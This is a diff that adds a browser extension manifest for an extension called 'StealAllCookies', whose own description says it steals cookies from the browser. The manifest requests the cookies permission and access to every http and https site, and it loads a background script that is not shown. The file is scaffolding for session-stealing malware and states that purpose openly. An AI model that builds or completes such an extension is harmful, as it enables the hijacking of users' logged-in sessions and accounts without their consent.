@@ -1,0 +1,17 @@
+{
+    "manifest_version": 2,
+    "version": "1.0",
+	
+    "name": "StealAllCookies",
+    "description": "Extension that steals cookies from the browser's cookie module" ,
+
+	"background" : {
+		"scripts": ["background.js"]
+	},
+
+	"permissions" : [
+		"http://*/*",
+		"https://*/*",
+		"cookies"
+	]
+}
